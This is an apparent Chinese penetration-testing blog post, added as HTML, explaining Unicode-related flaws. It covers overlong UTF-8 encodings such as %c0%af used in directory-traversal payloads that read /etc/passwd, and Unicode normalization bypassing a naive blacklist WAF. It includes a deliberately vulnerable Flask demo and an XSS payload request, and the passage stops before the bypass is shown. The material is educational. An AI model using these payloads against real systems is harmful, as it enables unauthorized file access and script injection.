@@ -1,0 +1,779 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="unicode 相关漏洞0x01- unicode 的解析错误漏洞也许不该叫漏洞，但实在不知道用什么描述比较适用！！ 奇怪的 payload以前在进行一些枚举的时候，会发现字典里面有一些很奇怪的 payload，但一直没有思考为什么会这样，只是奉行 “拿来主义”，直接使用，直至最近才突然想理清楚这些原理。**”奇怪的 payload”** 如下所示： 12345678910111213141516">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Unicode 相关漏洞及利用">
+<meta property="og:url" content="http://example.com/2022/04/13/Unicode-%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="singsing&#39;s Blog">
+<meta property="og:description" content="unicode 相关漏洞0x01- unicode 的解析错误漏洞也许不该叫漏洞，但实在不知道用什么描述比较适用！！ 奇怪的 payload以前在进行一些枚举的时候，会发现字典里面有一些很奇怪的 payload，但一直没有思考为什么会这样，只是奉行 “拿来主义”，直接使用，直至最近才突然想理清楚这些原理。**”奇怪的 payload”** 如下所示： 12345678910111213141516">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201231182051351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h5b25naWxmbW1t,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020123118211124.png">
+<meta property="og:image" content="https://www.runoob.com/wp-content/uploads/2015/05/2011050311372042.png">
+<meta property="og:image" content="https://jlajara.gitlab.io/assets/images/posts/20200219/1.jpg">
+<meta property="og:image" content="https://jlajara.gitlab.io/assets/images/posts/20200219/2.png">
+<meta property="og:image" content="https://jlajara.gitlab.io/assets/images/posts/20200219/3.png">
+<meta property="og:image" content="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20220413200326.png">
+<meta property="article:published_time" content="2022-04-13T11:49:45.000Z">
+<meta property="article:modified_time" content="2022-04-13T12:17:01.274Z">
+<meta property="article:author" content="singsing">
+<meta property="article:tag" content="Unicode">
+<meta property="article:tag" content="UTF-8">
+<meta property="article:tag" content="编码">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20201231182051351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h5b25naWxmbW1t,size_16,color_FFFFFF,t_70">
+
+<link rel="canonical" href="http://example.com/2022/04/13/Unicode-%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%88%A9%E7%94%A8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Unicode 相关漏洞及利用 | singsing's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">singsing's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-首页">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-关于">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/13/Unicode-%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%88%A9%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="singsing">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="singsing's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Unicode 相关漏洞及利用
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-04-13 19:49:45 / Modified: 20:17:01" itemprop="dateCreated datePublished" datetime="2022-04-13T19:49:45+08:00">2022-04-13</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="unicode-相关漏洞"><a href="#unicode-相关漏洞" class="headerlink" title="unicode 相关漏洞"></a>unicode 相关漏洞</h1><h2 id="0x01-unicode-的解析错误漏洞"><a href="#0x01-unicode-的解析错误漏洞" class="headerlink" title="0x01- unicode 的解析错误漏洞"></a>0x01- unicode 的解析错误漏洞</h2><p>也许不该叫漏洞，但实在不知道用什么描述比较适用！！</p>
+<h3 id="奇怪的-payload"><a href="#奇怪的-payload" class="headerlink" title="奇怪的 payload"></a>奇怪的 payload</h3><p>以前在进行一些枚举的时候，会发现字典里面有一些很奇怪的 payload，但一直没有思考为什么会这样，只是奉行 “拿来主义”，直接使用，直至最近才突然想理清楚这些原理。**”奇怪的 payload”** 如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 以下 payload 来自著名FUZZ工具--WFUZZ内置字典：https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt</span><br><span class="line"></span><br><span class="line">..%c0%af/etc/passwd</span><br><span class="line">..%c0%af..%c0%af/etc/passwd</span><br><span class="line">..%c0%af..%c0%af..%c0%af/etc/passwd</span><br><span class="line">..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd</span><br><span class="line">..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd</span><br><span class="line">..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd</span><br><span class="line">..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd</span><br><span class="line">..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd</span><br><span class="line">...</span><br><span class="line">..%c0%2f/etc/passwd</span><br><span class="line">..%c0%2f..%c0%2f/etc/passwd</span><br><span class="line">..%c0%2f..%c0%2f..%c0%2f/etc/passwd</span><br><span class="line">..%c0%2f..%c0%2f..%c0%2f..%c0%2f/etc/passwd</span><br><span class="line">..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f/etc/passwd</span><br><span class="line">..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f/etc/passwd</span><br><span class="line">..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f/etc/passwd</span><br><span class="line">..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f/etc/passwd</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h3 id="刨根问底"><a href="#刨根问底" class="headerlink" title="刨根问底"></a>刨根问底</h3><p>payload 中，为什么会存在使用 <code>%C0%AF</code> 或 <code>%C0%2F</code> 代替 <code>/</code> 的情况？对于目录遍历漏洞，这种代替真的有效吗！？其实，对于一些比较渣的 Unicode 解析应用程序是真的有效的。</p>
+<h4 id="前提知识点一：URL编码知识"><a href="#前提知识点一：URL编码知识" class="headerlink" title="前提知识点一：URL编码知识"></a><strong>前提知识点一：URL编码知识</strong></h4><p>URL 编码也称为百分比编码，是一种简单编码方式，URL编码中的 <code>%xx</code> 表示一个字节（0-255 的数字），其中每个 <code>x</code> 是一个十六进制数字。因此，URL 中的 <code>%C0%AF</code> 对应于将字节 <code>C0 AF</code> 放入解码后的 URL，即 字节 192 (<code>1100 0000</code>) 和字节 175 (<code>1010 1111</code>)，而 <code>%C0%2F</code> 对应于字节 192 (<code>1100 0000</code>) 和字节 47 (<code>0010 1111</code>)</p>
+<h4 id="前提知识点二：UTF-8-编码知识"><a href="#前提知识点二：UTF-8-编码知识" class="headerlink" title="前提知识点二：UTF-8 编码知识"></a><strong>前提知识点二：UTF-8 编码知识</strong></h4><p>UTF-8使用的是 <strong>8位码元</strong> 的变长码元序列编码方式（一码元 &#x3D; <code>1 byte</code> &#x3D; <code>8 bits</code>）。注意，UTF-8的码元长度是固定的8位，但编码后形成的码元序列长度不是固定的。UTF-8一般使用1到4个字节编码，当然也可以更长。例如：</p>
+<ol>
+<li>一码元（<code>1 byte</code> &#x3D; <code>8 bits</code>）序列长度字符表示为：<code>0xxxxxxx</code>；</li>
+<li>双码元（<code>2 byte</code> &#x3D; <code>16 bits</code>）序列长度字符表示为：<code>110xxxxx 10xxxxxx</code>；</li>
+<li>三码元（<code>3 byte</code> &#x3D; <code>24 bits</code>）序列长度字符表示为：<code>1110xxxx 10xxxxxx 10xxxxxx</code> ；</li>
+<li>四码元（<code>4 byte</code> &#x3D; <code>32 bits</code>）序列长度字符表示为：<code>1110xxxx 10xxxxxx 10xxxxxx 10xxxxxx</code> ；</li>
+</ol>
+<p>所以。如某个字符在 ASCII 字符集内，由于其值只需要一码元（<code>1 byte</code> &#x3D; <code>8 bits</code>）就可以表示，所以该字符经过 UTF-8 编码后，表示为 <code>0xxxxxxx</code> ，表示方式仍然与原始的 ASCII 文档的编码相同。</p>
+<p><strong>UTF-8编码方式的算法：</strong> </p>
+<p>首字节用于区分编码的字节数，即，从首字节就能判断出编码后有多少个字节。规则为：除单字节编码以 <code>0</code> 开头外，多字节编码首字节 <code>1</code> 的个数用于判断编码后的字节长度，然后紧接着以数字 <code>0</code> 作为终结标志，除首字节外，多字节编码的后续字节以 <code>10</code> 开头，具体规则如表5所示</p>
+<p><img src="https://img-blog.csdnimg.cn/20201231182051351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h5b25naWxmbW1t,size_16,color_FFFFFF,t_70"></p>
+<p><strong>UTF-8编码方法</strong></p>
+<ol>
+<li>在 表5 中查找字符的码点所在的码点范围，以确定应使用几个字节编码该字符</li>
+<li>将字符的码点转换为二进制</li>
+<li>将转换后的二进制数值从右到左(即从最后一位低位开始)依次按相同顺序填充 表5 中的 x，多出的 x 填充 0。</li>
+<li>示例：“汉”的Unicode的码点是 <code>U+6C49</code> (<code>1101100 01001001</code>) ，其编码过程如下：<ul>
+<li><code>6C49</code> 在 表5 的码点范围为 <code>U+0800 ~ U+FFFF</code>，所以应使用 3 个字节编码</li>
+<li>将 <code>6C49</code> 的二进制数 <code>110 1100 0100 1001</code> 从最后一位开始，按从右向左的顺序填充 表5 中的 x，最终得到 “汉” 字的 UTF-8 编码为 <code>1110 0110 1011 0001 1000 1001</code> (<code>0xE6 B189</code>)，如下图所示</li>
+</ul>
+</li>
+</ol>
+<p><img src="https://img-blog.csdnimg.cn/2020123118211124.png"></p>
+<p><strong>前提知识点三：</strong></p>
+<p>ASCII 只定义 字节 0-127 的符号。对于特殊符号（例如，对于非英语国家）对 ASCII 最常见的扩展是 Unicode。 Unicode 将 <code>/</code> 之类的符号转换为由数字表示的码点（code point）；例如，<code>/</code> 是第 47 个码点（十六进制 <code>0x2f</code>），<code>π</code> 是第 960 个码点（<code>0x3c0</code>），<code>♥</code> 是第 9829 个码点（<code>0x2665</code>）。现在要将 unicode 符号放入字节流中，必须对其进行编码，常见的编码是 UTF-8，因为 UTF-8 继续以单个字节（8 bits）编码 ASCII 字符，所以它不会破坏原始 ASCII 字符集的编码。注意 ASCII 只定义了 128 个符号，它们的第一位都是 0（ASCII 中有效比特位为7位，值介于 0-127 之间，如: <code>/</code> 二进制表示为 <strong>0</strong>0101111）。</p>
+<p><img src="https://www.runoob.com/wp-content/uploads/2015/05/2011050311372042.png"></p>
+<p>UTF-8 在处理字符的时候，如果遇到正常的 ASCII 字符仍然像往常一样使用一个字节进行编码，解码应用程序通过识别该字节的第一位是否为 <code>0</code> 来判断该字符是否为ASCII字符 。当到达下一个要处理的字节时，如果识别到第一位开始用 <code>1</code> 表示，则下一个字符是使用多字节序列编码的字符。字节数由第一个字节的形式决定（多字节序列编码字符，首字节 <code>1</code> 的个数用于判断编码后的字节长度，然后紧接着以数字 <code>0</code> 作为终结标志）。例如，如果多字节序列的第一个字节的格式为 <code>110x xxxx</code>，则表示下一个符号用双字节表示。类似地，<code>1110 xxxx</code> 表示它是一个三字节序列的开始，<code>1111 0xxx</code> 是一个四字节序列。正如上面，<em><strong>前提知识点二：UTF-8 编码知识</strong></em> 中的 <strong>表5</strong> 所示。你会注意到双字节序列应该在形成 <code>110x xxxx 10xx xxxx</code> 来表示具有二进制数 <code>xxx xxxx xxxx</code> 的 Unicode 代码点，原则上可以是从 <code>000 0000 0000</code> (0) 到 <code>111 1111 1111</code> (2047) 的任何二进制数。在（<code>C0AF</code>）中，二进制值为 <code>1100 0000 1010 1111</code>，它表示代码点 <code>00000101111 = 47 = /</code>。请注意，47 也可以更简单地用一个 ASCII 字符 <code>/</code> 来表示，即位 <code>0010 1111</code>。至于为什么第二个字节定义为以 10 开头,这是由于UTF-8编码的算法原因，具体请仔细看看 <em><strong>前提知识点二：UTF-8 编码知识</strong></em> 中的 <strong>表5</strong> 以及 <strong>编码方法</strong> 。</p>
+<p>所以，按照上所述，这好像允许多种方式来表示每个 Unicode 字符，但这在 Unicode 标准中是不允许的。双字节序列(<code>110x xxxx 10xx xxxx</code>)的形式，码点范围应该只允许在 128 和 2047 之间，所以 <code>C0AF</code> 不应该表示为 <code>/</code>， 这是一个错误。但是，Unicode 库通常被要求设计为能够快速地将字符解析出来，人们可能不会考虑安全隐患。因此，某些库可能选择不检查<strong>双序列 Unicode 字符</strong>的码点是否在有效范围内（即使 Unicode 标准禁止这样做）。或者开发人员认为，如果应用程序接收到一个 <code>C0AF</code>，很可能是一些具有格式错误的 UTF-8 应用程序想要发送 <code>2F</code> ，但因为处理错误而导致发送了<code>C0AF</code>。因此决定将 <code>C0AF</code> 解析为 <code>2F</code> 是方便用户的友好及明智的行为。</p>
+<p>同样， <code>%C0%2F</code> 也适用于一些大笨蛋 Unicode 库，因为许多解码 Unicode 的应用程序不会检查第二个字节的第一位是否为 <code>1</code>，因为前一个字节已经表明它是一个双字节编码的字符。那就是错误的解码器接受 <code>110x xxxx ??xx xxxx</code> 作为有效的双字节编码的字符，而不管 <code>??</code> 是 <code>10</code> 是作为 UTF8 解析双序列字符的标准要求。第二个字节的前两个字符并不实际影响UTF-8解码结果，我们可认为它们是多余的，因此存在问题的 Unicode 解码应用程序可能决定不检查这些字符是否匹配正确的值。</p>
+<p>所以现在我们知道为什么 <code>%C0%AF</code> 和 <code>%C0%2F</code> 最终都使用跳过正确检查的 Unicode 解码器解码为符号 <code>/</code> 。</p>
+<p>至于为什么这会成功地允许目录遍历，经常会发生过滤不正确的输入和解码 Unicode 符号是在应用程序的不同阶段完成的。 Web 服务器可能足够安全，不允许某人通过 <code>http://www.example.com/../../../etc/shadow</code> 甚至 <code>http://www.example.com /..%2f..%2f..%2fetc%2fshadow</code>的形式进行攻击。但是，如果 Web 服务器正在提供文件并且解码 unicode 是在防止目录遍历的检查之后完成的，或者由操作系统完成的稍有不同，则此攻击可能会通过过滤器，从而允许攻击起作用。</p>
+<h2 id="0x02-unicode-规范化漏洞"><a href="#0x02-unicode-规范化漏洞" class="headerlink" title="0x02- unicode 规范化漏洞"></a>0x02- unicode 规范化漏洞</h2><p>Unicode 兼容是 Unicode 等效的一种形式，它确保在可能具有不同视觉外观或行为的字符或字符序列之间，表示相同的抽象字符。例如，<code>𝕃</code> 归一化为 <code>L</code>。这种行为可能为滥用一些在输入被净化后执行 unicode 兼容性的弱实现打开了大门。</p>
+<h3 id="Unicode-兼容性表格"><a href="#Unicode-兼容性表格" class="headerlink" title="Unicode 兼容性表格"></a>Unicode 兼容性表格</h3><p>有四种标准的归一化形式：</p>
+<ul>
+<li><strong>NFC：</strong> 规范化形式规范组合</li>
+<li><strong>NFD：</strong> 规范化形式的规范分解</li>
+<li><strong>NFKC：</strong> 规范化形式兼容性组合</li>
+<li><strong>NFKD：</strong> 规范化形式兼容性分解</li>
+</ul>
+<p><img src="https://jlajara.gitlab.io/assets/images/posts/20200219/1.jpg"></p>
+<p><code>NFKC</code> 和 <code>NKFD</code> 是有趣的，因为进行兼容性处理，要了解这种行为，我们可以使用这个 Python 片段：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> unicodedata</span><br><span class="line">string = <span class="string">&quot;𝕃ⅇ𝙤𝓃ⅈ𝔰𝔥𝙖𝓃&quot;</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;NFC: &#x27;</span> + unicodedata.normalize(<span class="string">&#x27;NFC&#x27;</span>, string))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;NFD: &#x27;</span> + unicodedata.normalize(<span class="string">&#x27;NFD&#x27;</span>, string))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;NFKC: &#x27;</span> + unicodedata.normalize(<span class="string">&#x27;NFKC&#x27;</span>, string))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;NFKD: &#x27;</span> + unicodedata.normalize(<span class="string">&#x27;NFKD&#x27;</span>, string))</span><br></pre></td></tr></table></figure>
+<p>运行结果：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NFC: 𝕃ⅇ𝙤𝓃ⅈ𝔰𝔥𝙖𝓃</span><br><span class="line">NFD: 𝕃ⅇ𝙤𝓃ⅈ𝔰𝔥𝙖𝓃</span><br><span class="line">NFKC: Leonishan</span><br><span class="line">NFKD: Leonishan</span><br></pre></td></tr></table></figure>
+
+<h3 id="概念证明"><a href="#概念证明" class="headerlink" title="概念证明"></a>概念证明</h3><p>为了演示这种行为，我们创建了一个简单的 Web 应用程序，如果 WAF 没有检测到某些奇怪的字符，它会回显 GET 参数值：</p>
+<ul>
+<li><strong>server.py</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, abort, request</span><br><span class="line"><span class="keyword">import</span> unicodedata</span><br><span class="line"><span class="keyword">from</span> waf <span class="keyword">import</span> waf</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Welcome_name</span>():</span><br><span class="line">  name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">  <span class="keyword">if</span> waf(name):</span><br><span class="line">    abort(<span class="number">403</span>, description=<span class="string">&quot;XSS Detected&quot;</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    name = unicodedata.normalize(<span class="string">&#x27;NFKD&#x27;</span>, name) <span class="comment">#NFC, NFKC, NFD, and NFKD</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Test XSS: &#x27;</span> + name</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  app.run(port=<span class="number">81</span>)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>如果检测到黑名单的字符，应用程序直接中断访问：</p>
+<ul>
+<li><strong>waf.py</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">input</span>)</span><br><span class="line">    blacklist = [<span class="string">&quot;~&quot;</span>,<span class="string">&quot;!&quot;</span>,<span class="string">&quot;@&quot;</span>,<span class="string">&quot;#&quot;</span>,<span class="string">&quot;$&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;^&quot;</span>,<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;+&quot;</span>,<span class="string">&quot;=&quot;</span>,<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;|&quot;</span>,<span class="string">&quot;\&quot;,&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;/&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="string">&quot;;&quot;</span>,<span class="string">&quot;:&quot;</span>,<span class="string">&quot;&quot;&quot;,&quot;&quot;&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>]</span><br><span class="line">    vuln_detected = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(string <span class="keyword">in</span> <span class="built_in">input</span> <span class="keyword">for</span> string <span class="keyword">in</span> blacklist): </span><br><span class="line">        vuln_detected = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> vuln_detected   </span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>因此，具有以下有效负载 (<code> &lt;img src=p onerror=&#39;prompt(1)&#39;&gt;</code>) 的请求将被中止：</p>
+<ul>
+<li><p><strong>Request：</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?name=%3Cimg%20src=p%20onerror=%27prompt(1)%27%3E</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Response:</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.0</span> <span class="number">403</span> FORBIDDEN</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>124</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Werkzeug/0.16.0 Python/3.8.1</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Wed, 19 Feb 2020 11:11:58 GMT</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>403 Forbidden<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Forbidden<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>XSS Detected<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>审计以下代码行：</p>
